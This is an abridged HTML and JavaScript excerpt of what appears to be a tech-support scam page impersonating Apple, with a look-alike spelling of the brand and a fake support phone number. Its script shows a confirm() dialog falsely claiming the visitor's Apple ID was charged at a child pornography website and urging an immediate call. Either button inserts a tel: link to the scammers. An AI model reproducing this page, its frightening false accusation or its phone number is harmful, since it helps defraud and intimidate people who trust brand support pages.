...
<body>
            ...
            <div class="ac-ln-wrapper">
                ...
                <div class="ac-ln-content">
                    <span class="ac-ln-title">
                       <a href="#">Applẹ Support +1-855-518-4404 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
					 </span>
    ...
    <script>
        ...
        window.number = (window.number ? window.number : '+1-855-518-4404');
        ...
        function okkkk() {
            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-518-4404"></a>');
        ...
        function myFunction() {
            if (confirm("Your Applẹ ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Applẹ Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Applẹ Support +1-855-518-4404 to Freeze it!.")) {
                okkkk();
            } else {
                okkkk();
            }
